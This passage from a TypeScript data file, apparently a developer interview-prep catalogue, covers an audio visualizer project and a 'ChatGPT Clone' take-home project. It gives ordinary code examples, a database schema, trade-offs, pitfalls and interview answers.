        name: 'React UI Layer',
        description: 'React components manage the non-animated UI: source selection, playback controls, visualizer picker, and settings. The canvas is a single ref-accessed DOM element that bypasses React rendering entirely — React never re-renders the canvas content, only the surrounding UI controls.',
      },
    ],
    codeExamples: {
      typescript: `// audio/AudioEngine.ts
export class AudioEngine {
  private ctx: AudioContext;
  private analyser: AnalyserNode;
  private source: AudioNode | null = null;
  private freqBuffer: Uint8Array;
  private timeBuffer: Uint8Array;

  constructor(fftSize = 2048) {
    this.ctx = new AudioContext();
    this.analyser = this.ctx.createAnalyser();
    this.analyser.fftSize = fftSize;
    this.analyser.smoothingTimeConstant = 0.8; // 0=no smoothing, 1=max
    this.analyser.connect(this.ctx.destination);
    // fftSize/2 bins — frequency resolution = sampleRate / fftSize
    this.freqBuffer = new Uint8Array(this.analyser.frequencyBinCount);
    this.timeBuffer = new Uint8Array(this.analyser.fftSize);
  }

  async connectMicrophone(): Promise<void> {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    this.disconnectSource();
    this.source = this.ctx.createMediaStreamSource(stream);
    this.source.connect(this.analyser);
  }

  connectAudioElement(el: HTMLAudioElement): void {
    this.disconnectSource();
    this.source = this.ctx.createMediaElementSource(el);
    this.source.connect(this.analyser);
    this.source.connect(this.ctx.destination);
  }

  getFrequencyData(): Uint8Array {
    this.analyser.getByteFrequencyData(this.freqBuffer);
    return this.freqBuffer; // reused buffer — don't store reference
  }

  getTimeDomainData(): Uint8Array {
    this.analyser.getByteTimeDomainData(this.timeBuffer);
    return this.timeBuffer;
  }

  private disconnectSource() {
    this.source?.disconnect();
    this.source = null;
  }
}

// audio/beatDetection.ts
export function createBeatDetector(historyLength = 43) {
  const history = new Float32Array(historyLength);
  let idx = 0;

  return function detectBeat(freqData: Uint8Array, threshold = 1.5): boolean {
    // Sum the first 10 bins (bass frequencies ~0-430Hz at 44.1kHz)
    let energy = 0;
    for (let i = 0; i < 10; i++) energy += freqData[i];
    const current = energy / 10;

    // Rolling average of recent frames
    const avg = history.reduce((s, v) => s + v, 0) / historyLength;
    history[idx % historyLength] = current;
    idx++;

    return avg > 10 && current > avg * threshold;
  };
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Canvas 2D vs WebGL for rendering',
        picked: 'Canvas 2D for MVP, with a note on WebGL for scaling',
        reason: 'Canvas 2D handles frequency bars and waveforms with simple, readable code. It supports up to ~1000 particles at 60fps. WebGL requires shader code (GLSL) and a much steeper learning curve, but unlocks tens of thousands of particles and 3D visuals. For a portfolio project, Canvas 2D shows the concepts clearly; mention WebGL (Three.js) as the path to scaling up particle effects.',
      },
      {
        choice: 'fftSize of 2048 vs 256 vs 8192',
        picked: 'fftSize 2048',
        reason: 'fftSize determines frequency resolution: higher = more bins = finer frequency detail, but also more latency (larger FFT window). fftSize 256 gives 128 bins — too coarse for interesting visualizations. fftSize 2048 gives 1024 bins — fine enough to distinguish individual notes, with acceptable 46ms latency. fftSize 8192 is overkill for visualizations and adds 185ms latency.',
      },
      {
        choice: 'Reusing Uint8Array buffers vs copying on each frame',
        picked: 'Reuse the same Uint8Array (mutate in place)',
        reason: 'getByteFrequencyData() writes into an existing buffer in-place. If you copy the buffer each frame (new Uint8Array(analyser.frequencyBinCount) every rAF), you generate 60 GC allocations per second. The reused buffer approach is zero-allocation per frame. The trade-off: you must consume the data in the same frame tick before the next getByteFrequencyData() call overwrites it.',
      },
      {
        choice: 'AudioContext creation on page load vs on first user gesture',
        picked: 'On first user gesture (button click)',
        reason: 'Browsers block AudioContext creation before a user gesture (click, tap, keypress) to prevent autoplay abuse. Creating it on page load silently enters a "suspended" state and audio will not play. Creating on button click guarantees the context starts in a "running" state. This is a hard browser constraint, not a design choice.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'How the Web Audio API signal graph works',
        detail: 'The Web Audio API is a directed graph of AudioNode objects. Source nodes (MediaElementSource, MediaStreamSource, OscillatorNode) generate audio. Processing nodes (AnalyserNode, GainNode, BiquadFilterNode) transform or inspect audio. The destination node (ctx.destination) outputs to speakers. You build the graph by calling node.connect(nextNode). The AnalyserNode is a "tap" — it passes audio through unchanged while also exposing FFT data via getByteFrequencyData(). All processing happens off the main thread in the browser\'s audio worklet.',
      },
      {
        topic: 'Fast Fourier Transform and frequency bins',
        detail: 'The AnalyserNode applies an FFT to the time-domain audio signal to produce a frequency-domain representation. fftSize determines how many time-domain samples are analyzed per frame. frequencyBinCount = fftSize / 2 is the number of output frequency buckets. At a sample rate of 44,100Hz with fftSize 2048, each bin covers 44100/2048 ≈ 21.5Hz. Bin 0 = 0-21.5Hz (sub-bass), bin 10 = 215Hz (bass), bin 50 = 1075Hz (midrange), bin 512 = 11kHz (treble). This is why bass beats show up in the first 10-20 bins.',
      },
      {
        topic: 'Energy-based beat detection vs onset detection',
        detail: 'Simple energy beat detection works well for music with clear kick drums. It compares instantaneous bass energy to a rolling average and fires when energy spikes above the threshold. More sophisticated onset detection uses spectral flux — the sum of positive changes across all frequency bins between consecutive frames. Spectral flux detects note onsets (any instrument starting), not just bass hits. For a visualizer, energy detection is sufficient and much simpler. Mention spectral flux as the production approach.',
      },
      {
        topic: 'smoothingTimeConstant and temporal averaging',
        detail: 'The AnalyserNode has a smoothingTimeConstant property (0 to 1). At 0, each FFT frame is independent — raw and jittery. At 1, the output is a running average over many frames — very smooth but slow to respond. At 0.8 (the default), the effective formula is: output[i] = 0.8 * previous[i] + 0.2 * current[i]. For a visualizer, 0.7-0.8 gives a natural smoothness. For beat detection, you want low smoothing (0.3-0.5) so beats register as sharp spikes, not gradual rises.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Creating AudioContext before a user gesture',
        why: 'Browsers enforce an autoplay policy: AudioContext starts in a "suspended" state if created without a preceding user gesture. Audio plays silently with no error. The visualizer appears to work (no crashes) but shows a flat line because no audio data flows.',
        solution: 'Create the AudioContext inside a click handler (the "Start" or "Upload" button). Check ctx.state === "suspended" and call ctx.resume() if needed. Show a "Click to start audio" prompt if the context is suspended.',
      },
      {
        pitfall: 'Not canceling the animation frame on component unmount',
        why: 'If the component unmounts (user navigates away) while the rAF loop is running, the loop continues indefinitely. Each frame calls getFrequencyData() on the analyser, reads canvas refs, and calls setState — all on a dead component. This causes memory leaks and "setState on unmounted component" warnings.',
        solution: 'Store the rAF ID in a useRef. In the useEffect cleanup function, call cancelAnimationFrame(animFrameRef.current). Also close the AudioContext: ctx.close().',
      },
      {
        pitfall: 'Canvas renders at CSS size instead of physical pixel size',
        why: 'A canvas element sized to 800x400 via CSS but with width/height attributes of 800x400 on a 2x retina display renders at half resolution — blurry on high-DPI screens.',
        solution: 'Set canvas.width = rect.width * devicePixelRatio and canvas.height = rect.height * devicePixelRatio. Then ctx.scale(devicePixelRatio, devicePixelRatio) to scale drawing operations back to CSS pixels. This produces crisp rendering on retina displays.',
      },
      {
        pitfall: 'Connecting the same audio element to two MediaElementSource nodes',
        why: 'A single HTMLAudioElement can only be connected to one MediaElementSource. Calling createMediaElementSource() on an already-connected element throws: "HTMLMediaElement already connected previously to a different MediaElementSourceNode".',
        solution: 'Store the MediaElementSource in a ref. When the user uploads a new file, disconnect the old source and reuse the existing audio element by changing its src, rather than creating a new MediaElementSource.',
      },
    ],
    edgeCases: [
      {
        scenario: 'User denies microphone permission',
        impact: 'getUserMedia() rejects with a NotAllowedError. Without a catch block, this is an unhandled promise rejection. The UI shows no feedback and appears broken.',
        mitigation: 'Wrap getUserMedia in try/catch. On NotAllowedError, show a user-facing message: "Microphone access denied. Please allow microphone access in your browser settings." Disable the microphone button and keep file upload available.',
      },
      {
        scenario: 'Audio file with no audio track (e.g., silent video)',
        impact: 'The AudioContext plays the file, the analyser runs, but all frequency bins return 0. The visualizer shows a flat line with no animation.',
        mitigation: 'Detect a flat visualizer after 2 seconds of play (check if all frequency bin values are below 5). Show a warning: "No audio detected. The file may be silent." This is rare but good defensive programming.',
      },
      {
        scenario: 'Very long audio file (2+ hours)',
        impact: 'When connecting an <audio> element via createMediaElementSource, the browser may attempt to decode the entire file into memory, causing a multi-second freeze or out-of-memory crash.',
        mitigation: 'The <audio> element with createMediaElementSource streams audio — it does not decode the whole file upfront. This is a common misconception. The full-file issue only occurs with createBufferSource (which requires AudioContext.decodeAudioData on the entire file). Stick with MediaElementSource for file playback.',
      },
      {
        scenario: 'Browser tab becomes background (hidden)',
        impact: 'Chrome throttles requestAnimationFrame to 1fps for hidden tabs. The visualizer freezes visually but audio continues playing. When the tab returns to focus, the rAF loop resumes and audio/visual sync is maintained because the analyser always returns current-frame data.',
        mitigation: 'This is acceptable behavior — no action needed. Optionally listen to document.visibilitychange and pause the visualizer when hidden to save CPU.',
      },
    ],
    interviewFollowups: [
      {
        question: 'Explain the Web Audio API signal graph you built.',
        answer: 'The graph flows: AudioSource → AnalyserNode → AudioContext.destination. For file playback, the source is a MediaElementSourceNode wrapping an <audio> element. For microphone, it is a MediaStreamSourceNode from getUserMedia. The AnalyserNode is a transparent pass-through that also exposes FFT frequency data and time-domain waveform data via getByteFrequencyData() and getByteTimeDomainData(). The destination is the speaker output. All processing happens off the main thread in the browser\'s audio worklet thread.',
      },
      {
        question: 'How does your beat detection work?',
        answer: 'I take the first 10 frequency bins from the AnalyserNode output — these cover roughly 0-215Hz, the bass frequency range where kick drums and bass lines live. I average those 10 bin values to get the current bass energy. I maintain a rolling circular buffer of the last 43 readings (about one second at 43fps). If the current energy exceeds the buffer average by more than 1.5x, I fire a beat event. The threshold and history length are configurable. For more sophisticated detection, I would implement spectral flux — tracking energy changes across ALL frequency bins to catch any instrument onset, not just bass.',
      },
      {
        question: 'Why does your canvas look blurry on a MacBook retina display?',
        answer: 'This is the device pixel ratio problem. A retina display has 2 physical pixels per CSS pixel. If I set canvas.width = 800 in CSS but the canvas attribute is also 800, I am rendering at half the display resolution — the browser upscales by 2x and the result is blurry. The fix: set canvas.width = rect.width * window.devicePixelRatio (e.g., 1600 on a 2x display), and ctx.scale(devicePixelRatio, devicePixelRatio) so drawing coordinates still use CSS pixel units. This is the same reason images need 2x srcset on retina displays.',
      },
      {
        question: 'What would you need to change to add 3D particle effects?',
        answer: 'Replace the Canvas 2D renderer with Three.js. Each particle becomes a Three.js Points object (a BufferGeometry with a PointsMaterial). The particle positions are stored in a Float32Array attribute and updated on the GPU each frame via bufferAttribute.needsUpdate = true. Three.js handles the WebGL boilerplate (shader compilation, VAO setup, transform matrices). The beat detection and audio data pipeline stay identical — I just feed the frequency data into the Three.js animation loop instead of the Canvas 2D loop. Canvas 2D tops out around 2000 particles; Three.js handles 100,000+ at 60fps.',
      },
    ],
    extensionIdeas: [
      {
        idea: '3D Particle System with Three.js',
        difficulty: 'advanced',
        description: 'Replace the Canvas 2D particle system with a Three.js BufferGeometry-based particle cloud. Particles orbit a central sphere, respond to beat events with velocity bursts, and use a vertex shader to color particles based on their distance from the center. Supports 50,000+ particles at 60fps versus Canvas 2D\'s ~1000 limit.',
      },
      {
        idea: 'Circular / Radial Frequency Visualizer',
        difficulty: 'intermediate',
        description: 'Instead of horizontal bars, render frequency bins as radial spokes emanating from the center of a circle. Bass frequencies appear at the bottom (6 o\'clock), treble at the top (12 o\'clock). The result looks like a blooming flower that pulses with the music. Add a mirrored variant for symmetry.',
      },
      {
        idea: 'Karaoke Mode with WebVTT Lyrics Sync',
        difficulty: 'advanced',
        description: 'Accept a .vtt (WebVTT) subtitle file alongside the audio file. Parse the timestamp cues and display the current lyric line centered over the visualizer, with word-by-word highlight synced to the audio playhead. Creates a full karaoke experience on top of the existing visualizer.',
      },
      {
        idea: 'Multiple Visualizer Panels',
        difficulty: 'intermediate',
        description: 'Split the screen into 4 quadrants, each showing a different visualizer (bars, waveform, particles, spectrogram). All four update from the same AnalyserNode data in the same rAF loop. Add a fullscreen toggle per panel. This turns the app into a multi-view audio analysis tool, which is impressive for a portfolio demo.',
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // TAKE-HOME PROJECTS
  // ═══════════════════════════════════════════════════════════
  {
    id: 'chatgpt-clone',
    title: 'ChatGPT Clone',
    icon: 'messageSquare',
    color: '#f59e0b',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'Next.js', 'TypeScript', 'Python', 'Docker', 'WebSocket'],
    questions: 5,
    description: 'Build a full-stack ChatGPT clone with real-time streaming responses, conversation history, and multiple chat sessions.',
    introduction: 'Create a chat application that mimics ChatGPT\'s core UX: streaming AI responses, markdown rendering, code syntax highlighting, conversation history, and session management. This is the most common AI-related take-home project in 2024-2026.\n\nThe ChatGPT clone has become the definitive take-home project for AI-focused engineering roles. Every candidate claims to understand LLM integration, but building a working streaming chat interface from scratch proves it. The project covers the full stack: a Python backend that proxies AI API calls with streaming, an SSE transport layer that delivers tokens in real time, and a React frontend that renders them progressively with markdown formatting.\n\nThe UX details are what separate a passing submission from an impressive one. Token-by-token rendering that updates without visible flicker, auto-scrolling that respects manual scroll position, code blocks with syntax highlighting and copy buttons, conversation sidebar with rename and delete, and keyboard shortcuts for power users. These are the features that ChatGPT itself refined over months, and recreating them shows deep product thinking.\n\nFor interviews, this project opens rich technical discussions: SSE vs WebSocket trade-offs, context window management strategies, streaming performance optimization, Docker containerization, and database schema design for conversation persistence. It is the highest-ROI take-home project for any full-stack or AI-adjacent role.',
    interviewRelevance: 'The number one take-home project for AI/ML and full-stack roles. Tests your ability to build real-time streaming UIs, handle WebSocket/SSE communication, manage complex state across sessions, and integrate with AI APIs. Evaluators specifically look for: correct SSE implementation (not polling), responsive token-by-token rendering without performance issues, proper conversation context management (sending full history to the API), Docker containerization with a one-command setup, and production-quality error handling for API failures and rate limits. This project also opens discussions about context window management, model selection, prompt engineering, and cost optimization strategies that are highly relevant for AI engineering roles.',
    learningObjectives: [
      'Build a streaming chat UI with token-by-token response rendering',
      'Implement WebSocket or SSE backend for real-time communication',
      'Create conversation management: multiple sessions, rename, delete, search',
      'Add message features: markdown rendering, code blocks with copy, image upload',
      'Build a Python backend that proxies to OpenAI/Claude API with streaming',
      'Handle streaming performance with ref-based token accumulation to avoid per-token re-renders',
      'Implement auto-scroll behavior that respects manual user scroll position during streaming',
      'Add error handling for API rate limits, network failures, and partial response recovery',
      'Build Docker Compose configuration for one-command local development setup',
      'Create a context window management strategy for long conversations approaching token limits',
    ],
    keyQuestions: [
      { question: 'WebSocket vs SSE for streaming?', answer: 'SSE (Server-Sent Events) is the right choice for a ChatGPT clone. The communication pattern is predominantly server-to-client: the server streams tokens and the client renders them. SSE works over standard HTTP, supports automatic reconnection, and requires no special server infrastructure. WebSocket provides full-duplex communication but adds complexity with connection state management, heartbeat pings, and reconnection logic. The only case where WebSocket adds value is if you need client-to-server streaming on the same channel (for example, a stop generating signal), but you can handle that with a separate HTTP DELETE request instead. SSE is also more compatible with HTTP/2 multiplexing and proxy servers. Most production ChatGPT clones, including OpenAI\'s own interface, use SSE for token streaming.' },
      { question: 'How do I implement token-by-token streaming?', answer: 'The pipeline has three stages. Backend: call the AI API with stream=True, which returns an async iterator of token chunks. Wrap this in a FastAPI StreamingResponse that formats each chunk as SSE: data: {token} followed by two newlines. Send data: [DONE] when the stream ends. Frontend: use the Fetch API with response.body.getReader() to consume the ReadableStream. Decode each Uint8Array chunk with TextDecoder, parse the SSE format (split by newlines, extract data: prefix), and append tokens to a ref (not state) to avoid a React re-render per token. Use a setInterval or requestAnimationFrame to batch-update the displayed state every 50ms from the ref. This approach renders smoothly at any token rate without overwhelming React\'s reconciliation.' },
      { question: 'How should I store conversation history?', answer: 'For a take-home submission, localStorage or IndexedDB is sufficient and avoids the need for database infrastructure. For a production-quality implementation, use PostgreSQL with two tables: conversations (id UUID, title VARCHAR(100), created_at, updated_at) and messages (id UUID, conversation_id UUID FK, role VARCHAR(10), content TEXT, created_at). The title auto-generates from the first user message truncated to 40 characters. When sending a request to the AI API, fetch all messages for the conversation from the database, map them to the [{role, content}] format, append the new user message, and send the full array. This gives the AI conversational context. After the streaming response completes, persist the full assistant message in a single INSERT.' },
      { question: 'What features make a ChatGPT clone stand out?', answer: 'Beyond basic chat, these features signal production quality: code syntax highlighting using rehype-highlight with a copy-to-clipboard button on each code block, LaTeX math rendering with KaTeX for mathematical expressions, conversation search using PostgreSQL full-text search across all messages, keyboard shortcuts (Cmd+K for new conversation, Cmd+Enter to send, Escape to stop generating), dark and light theme with system preference detection, response regeneration that re-sends the conversation without the last assistant message, and a stop generating button that cancels the in-flight stream via AbortController. Each feature is relatively small to implement but collectively they transform the project from a demo into a genuinely usable application.' },
      { question: 'How do I handle the Docker requirement?', answer: 'Create a docker-compose.yml with three services: frontend (Node.js with Next.js), backend (Python with FastAPI), and db (PostgreSQL). Use named volumes for database persistence. Configure the backend service with environment variables for the API key and database URL. Add a .env.example file with placeholder values and clear setup instructions. Create a Makefile with intuitive commands: make dev starts everything, make build creates production images, make test runs the test suite, make seed populates sample data. The frontend service should use Next.js rewrites to proxy API calls to the backend service name (http://backend:8000) inside the Docker network. Include a comprehensive README with prerequisites (Docker, an API key), one-command setup, and troubleshooting tips for common issues like port conflicts.' },
      { question: 'How do I manage conversations that exceed the AI model context window?', answer: 'As conversations grow, the total token count of all messages approaches the model context limit (for example, 128K tokens for GPT-4o). Three strategies exist. Strategy one: always include all messages, which works until the conversation hits the limit and then fails. Strategy two: sliding window, where you include the system prompt plus the last N messages that fit within the token budget. Strategy three: summarization, where you use a separate LLM call to compress older messages into a concise summary, prepend that summary as a system message, and include only recent messages verbatim. For a take-home, strategy one is acceptable but you should mention the others to demonstrate awareness. In production, strategy three provides the best user experience because the AI retains context from the entire conversation without hitting token limits.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Project Scaffold & Docker',
        description: 'Set up the monorepo structure with Next.js frontend, FastAPI backend, and Docker Compose configuration so both services start with a single command.',
        tasks: [
          'Initialize Next.js 14 app with TypeScript in /frontend',
          'Create FastAPI app in /backend with requirements.txt (fastapi, uvicorn, openai, python-dotenv)',
          'Write docker-compose.yml with frontend (port 3000) and backend (port 8000) services',
          'Configure CORS in FastAPI to allow requests from localhost:3000',
          'Add .env.example with OPENAI_API_KEY placeholder and README quick-start',
        ],
      },
      {
        phase: 2,
        title: 'Database Schema & Conversation API',
        description: 'Design the PostgreSQL schema for conversations and messages, then build the REST endpoints for CRUD operations.',
        tasks: [
          'Create conversations table (id, title, created_at, updated_at) and messages table (id, conversation_id, role, content, created_at)',
          'Add SQLAlchemy models and Alembic migrations for both tables',
          'Implement GET /api/conversations and POST /api/conversations endpoints',
          'Build GET /api/conversations/:id/messages and DELETE /api/conversations/:id',
          'Write auto-title generation: first user message truncated to 40 chars',
        ],
      },
      {
        phase: 3,
        title: 'Streaming Chat Endpoint',
        description: 'Build the SSE streaming endpoint that proxies to the OpenAI API and streams tokens back to the client in real time.',
        tasks: [
          'Implement POST /api/chat/stream as an SSE endpoint (StreamingResponse)',
          'Send full conversation history as the messages array to OpenAI API with stream=True',
          'Forward each chunk via SSE data: {token}\\n\\n, close with data: [DONE]\\n\\n',
          'Persist the complete assistant message to the database after streaming ends',
          'Add error handling: 429 rate limit, 500 API errors with proper SSE error events',
        ],
      },
      {
        phase: 4,
        title: 'Chat UI & Polish',
        description: 'Build the streaming chat interface with markdown rendering, code highlighting, session sidebar, and final UX polish.',
        tasks: [
          'Build ChatMessage component with react-markdown + rehype-highlight for code blocks',
          'Implement useStream hook: fetch with ReadableStream, append tokens to state via useRef',
          'Create conversation sidebar with list, rename (double-click), and delete with confirmation',
          'Add auto-scroll-to-bottom with "scroll to bottom" button when user scrolls up',
          'Implement keyboard shortcuts: Cmd+Enter to send, Cmd+K for new conversation',
        ],
      },
    ],
    fileStructure: `chatgpt-clone/
├── docker-compose.yml
├── Makefile
├── .env.example
├── README.md
├── frontend/
│   ├── Dockerfile
│   ├── package.json
│   ├── next.config.ts
│   ├── src/
│   │   ├── app/
│   │   │   ├── layout.tsx
│   │   │   ├── page.tsx
│   │   │   └── chat/[id]/page.tsx
│   │   ├── components/
│   │   │   ├── Sidebar.tsx
│   │   │   ├── ChatWindow.tsx
│   │   │   ├── ChatMessage.tsx
│   │   │   ├── MessageInput.tsx
│   │   │   └── StreamingIndicator.tsx
│   │   ├── hooks/
│   │   │   ├── useStream.ts
│   │   │   └── useConversations.ts
│   │   ├── lib/
│   │   │   └── api.ts
│   │   └── types/
│   │       └── index.ts
└── backend/
    ├── Dockerfile
    ├── requirements.txt
    ├── main.py
    ├── database.py
    ├── models.py
    ├── schemas.py
    └── routers/
        ├── conversations.py
        └── chat.py`,
    architectureLayers: [
      { name: 'Presentation Layer', description: 'Next.js App Router pages and React components — ChatWindow renders the message list, MessageInput manages the textarea, Sidebar lists all conversations with rename/delete actions.' },
      { name: 'Streaming Hook Layer', description: 'useStream custom hook wraps the native Fetch ReadableStream API to incrementally append token chunks to local state, decoupling SSE parsing from UI rendering.' },
      { name: 'API Client Layer', description: 'Typed fetch wrappers in lib/api.ts for all REST endpoints (conversation CRUD) and the streaming SSE endpoint, with error normalization and retry logic.' },
      { name: 'FastAPI Route Layer', description: 'Python routers handle HTTP requests, validate request bodies with Pydantic schemas, and delegate to service functions. SSE route uses StreamingResponse with an async generator.' },
      { name: 'AI Service Layer', description: 'Thin wrapper around the OpenAI SDK that builds the messages array from conversation history and yields token chunks from the streaming response, then persists the completed message.' },
      { name: 'Persistence Layer', description: 'PostgreSQL via SQLAlchemy ORM — conversations and messages tables. All queries are async (asyncpg driver) to avoid blocking the event loop during streaming.' },
    ],
    dataModel: {
      description: 'Two tables: conversations stores chat sessions with auto-generated titles, messages stores each turn with role (user/assistant) and content. Foreign key with CASCADE delete keeps cleanup simple.',
      schema: `-- Conversations: one row per chat session
CREATE TABLE conversations (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  title       VARCHAR(100) NOT NULL DEFAULT 'New Chat',
  created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Messages: one row per turn (user or assistant)
CREATE TABLE messages (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id UUID NOT NULL REFERENCES conversations(id) ON DELETE CASCADE,
  role            VARCHAR(10) NOT NULL CHECK (role IN ('user', 'assistant', 'system')),
  content         TEXT NOT NULL,
  created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_messages_conversation_id ON messages(conversation_id, created_at);`,
    },
    apiDesign: {
      description: 'REST endpoints for conversation management plus one SSE streaming endpoint for chat. All endpoints return JSON except /chat/stream which returns text/event-stream.',
      endpoints: [
        { method: 'GET', path: '/api/conversations', response: 'Array of { id, title, created_at, updated_at } ordered by updated_at DESC' },
        { method: 'POST', path: '/api/conversations', response: '{ id, title, created_at } — creates empty conversation' },
        { method: 'GET', path: '/api/conversations/:id/messages', response: 'Array of { id, role, content, created_at } ordered chronologically' },
        { method: 'DELETE', path: '/api/conversations/:id', response: '204 No Content — cascades to messages' },
        { method: 'PATCH', path: '/api/conversations/:id', response: '{ id, title } — rename conversation' },
        { method: 'POST', path: '/api/chat/stream', response: 'SSE stream: data: {token}\\n\\n per chunk, data: [DONE]\\n\\n on finish' },
      ],
    },
    codeExamples: {
      typescript: `// hooks/useStream.ts — core streaming implementation
import { useState, useRef, useCallback } from 'react';

interface UseStreamOptions {
  onComplete?: (fullText: string) => void;
}

export function useStream({ onComplete }: UseStreamOptions = {}) {
  const [streamingText, setStreamingText] = useState('');
  const [isStreaming, setIsStreaming] = useState(false);
  const accumulatedRef = useRef('');

  const startStream = useCallback(async (conversationId: string, userMessage: string) => {
    setIsStreaming(true);
    setStreamingText('');
    accumulatedRef.current = '';

    const response = await fetch('/api/chat/stream', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ conversation_id: conversationId, message: userMessage }),
    });

    if (!response.body) throw new Error('No response body');

    const reader = response.body.getReader();
    const decoder = new TextDecoder();

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      const chunk = decoder.decode(value, { stream: true });
      // Parse SSE format: "data: token\\n\\n"
      const lines = chunk.split('\\n').filter(l => l.startsWith('data: '));
      for (const line of lines) {
        const token = line.slice(6); // remove "data: "
        if (token === '[DONE]') continue;
        accumulatedRef.current += token;
        setStreamingText(accumulatedRef.current);
      }
    }

    setIsStreaming(false);
    onComplete?.(accumulatedRef.current);
  }, [onComplete]);

  return { streamingText, isStreaming, startStream };
}`,
    },
    tradeoffDecisions: [
      { choice: 'SSE vs WebSocket', picked: 'SSE', reason: 'Chat is unidirectional (server streams tokens to client). SSE is simpler — it works over regular HTTP, has automatic reconnection, and requires no special server infrastructure. WebSocket adds complexity with no benefit for this use case.' },
      { choice: 'FastAPI vs Node.js backend', picked: 'FastAPI', reason: 'The OpenAI Python SDK is the first-class client. FastAPI\'s async support and StreamingResponse make SSE trivial to implement. TypeScript backends require workarounds for streaming that Python handles natively.' },
      { choice: 'In-memory state vs PostgreSQL', picked: 'PostgreSQL', reason: 'The project spec requires conversation persistence. In-memory state is lost on server restart. PostgreSQL with a simple two-table schema adds minimal complexity and demonstrates full-stack competence that evaluators value.' },
      { choice: 'Next.js App Router vs Pages Router', picked: 'App Router', reason: 'App Router is the current Next.js default and what evaluators expect in 2024+. Server Components can pre-fetch conversation list, reducing client-side loading states. Pages Router is legacy.' },
    ],
    deepDiveTopics: [
      { topic: 'SSE vs WebSocket trade-offs', detail: 'SSE (Server-Sent Events) uses a persistent HTTP connection where only the server pushes data. It automatically reconnects, works through HTTP/2 multiplexing, and needs no special infrastructure. WebSocket provides full duplex but requires maintaining connection state on the server. For token streaming, SSE is strictly superior — the only time WebSocket makes sense is if you need the client to push mid-stream (e.g., "stop generating" via the same channel, though you can also do this with a separate HTTP request).' },
      { topic: 'Conversation context window management', detail: 'Language models have a context window (e.g., 128K tokens for GPT-4o). As conversations grow, you must decide what to include in the messages array. Strategies: 1) Always include all messages (simple, works until context limit), 2) Sliding window — last N messages, 3) Summarization — use an LLM call to compress old messages into a summary. For a take-home, strategy 1 is fine; mention the others to show awareness.' },
      { topic: 'Streaming and React re-render performance', detail: 'Appending one token at a time to React state causes a re-render per token (~30/second). For a 500-token response, that is 500 re-renders. Mitigation: accumulate tokens in a ref (no re-render), batch-update state every 50ms with setInterval, or use React 18 automatic batching. The ref approach is simplest and most performant.' },
      { topic: 'Markdown rendering security', detail: 'Rendering raw AI-generated markdown as HTML creates XSS risks. Always use react-markdown with rehype-sanitize (or use the default safe renderer). Never use dangerouslySetInnerHTML with AI output. For code blocks, add rehype-highlight for syntax highlighting and a copy-to-clipboard button on the <pre> element.' },
    ],
    commonPitfalls: [
      { pitfall: 'Blocking the event loop during streaming', why: 'If you use synchronous database writes inside the streaming loop, each token insert blocks other requests. A 200-token response with synchronous writes could lock the server for seconds.', solution: 'Buffer the full response in memory during streaming, then write the complete message to the database in a single INSERT after the stream ends.' },
      { pitfall: 'Not including conversation history in API calls', why: 'Sending only the latest user message means the AI has no memory — it cannot refer to earlier messages, making multi-turn conversation impossible.', solution: 'Fetch all messages for the conversation from the database, map to [{role, content}] format, append the new user message, and send the full array to the OpenAI API.' },
      { pitfall: 'Auto-scrolling fighting user scroll position', why: 'If you always scroll to the bottom on every new token, users cannot read earlier messages while streaming is in progress.', solution: 'Track whether the user has manually scrolled up using a scroll event listener. Only auto-scroll if the user is at (or near) the bottom — within 100px of the scroll container\'s bottom.' },
      { pitfall: 'Docker networking misconfiguration', why: 'The frontend container cannot reach localhost:8000 because localhost inside a container refers to the container itself, not the host.', solution: 'In docker-compose.yml, use the service name as the hostname: BACKEND_URL=http://backend:8000. For browser-side API calls, use the host machine\'s port mapping (localhost:8000) via Next.js rewrites or environment variables.' },
    ],
    edgeCases: [
      { scenario: 'OpenAI API rate limit (429) mid-stream', impact: 'The SSE connection drops after partial response. The database has no message for that turn. The UI shows a truncated response.', mitigation: 'Catch 429 errors in the streaming generator. Send a SSE error event to the client. On the client, show a "Rate limited — try again in Xs" message. Do not persist the partial message.' },
      { scenario: 'User closes browser tab during streaming', impact: 'The SSE connection closes. The backend generator may continue running and consuming API credits.', mitigation: 'Use request.is_disconnected() (FastAPI) or listen for the disconnect signal to cancel the generator. Wrap the streaming loop in a try/finally to ensure cleanup runs even on abrupt connection close.' },
      { scenario: 'Very long AI response exceeding VARCHAR limit', impact: 'Database INSERT fails with a string truncation error for responses over the column limit.', mitigation: 'Use TEXT type (unlimited length) for the content column in PostgreSQL, not VARCHAR(n). TEXT is equally performant and has no length limit.' },
      { scenario: 'Concurrent requests to the same conversation', impact: 'Two users or browser tabs sending messages simultaneously causes message ordering to be non-deterministic.', mitigation: 'Disable the send button while a stream is in progress. On the backend, use database-level SERIALIZABLE transactions if multiple writers are a real concern.' },
    ],
    interviewFollowups: [
      { question: 'How would you add user authentication?', answer: 'Add a users table and associate conversations with user_id. Use NextAuth.js on the frontend (Google/GitHub OAuth). Protect all API routes with a JWT middleware that extracts user_id from the Authorization header. Filter all conversation queries by the authenticated user_id.' },
      { question: 'How would you scale this to 10,000 concurrent streaming connections?', answer: 'SSE connections are long-lived and lightweight (no heavy WebSocket handshake). FastAPI with uvicorn handles many concurrent connections via async I/O. Horizontal scaling: deploy multiple backend instances behind a load balancer. The stateless design (all state in PostgreSQL) means any instance can handle any request.' },
      { question: 'How would you implement a "stop generating" button?', answer: 'On the frontend, store an AbortController per stream request. The stop button calls controller.abort(), which closes the fetch connection. On the backend, detect the disconnect via request.is_disconnected() and break out of the streaming generator loop. Persist whatever was accumulated up to that point.' },
